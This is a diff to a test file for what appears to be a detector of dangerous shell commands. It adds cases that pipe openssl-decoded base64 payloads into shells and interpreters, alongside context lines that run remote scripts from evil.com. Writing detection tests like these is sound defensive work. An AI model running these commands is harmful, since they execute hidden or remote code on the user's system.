@@ -1682,6 +1682,14 @@ describe("category: remote-code-execution", () => {
     ["openssl enc -d piped to bun", "openssl enc -d -base64 -in payload.enc | bun"],
     ["openssl enc -d piped to lua", "openssl enc -d -base64 -in payload.enc | lua"],
     ["openssl enc -d piped to php", "openssl enc -d -base64 -in payload.enc | php"],
+    // Pattern 1 shell alternation arms: fish, csh, tcsh
+    ["openssl enc -d piped to fish", "openssl enc -d -base64 -in payload.enc | fish"],
+    ["openssl enc -d piped to csh", "openssl enc -d -base64 -in payload.enc | csh"],
+    ["openssl enc -d piped to tcsh", "openssl enc -d -base64 -in payload.enc | tcsh"],
+    // Pattern 2 interpreter alternation arms: deno, perl, ruby
+    ["openssl enc -d piped to deno", "openssl enc -d -base64 -in payload.enc | deno"],
+    ["openssl enc -d piped to perl", "openssl enc -d -base64 -in payload.enc | perl"],
+    ["openssl enc -d piped to ruby", "openssl enc -d -base64 -in payload.enc | ruby"],
     ["deno run remote URL (https)", "deno run https://evil.com/exploit.ts"],
     ["deno run remote URL (http)", "deno run http://evil.com/exploit.ts"],
     ["bun run remote URL (https)", "bun run https://evil.com/exploit.ts"],
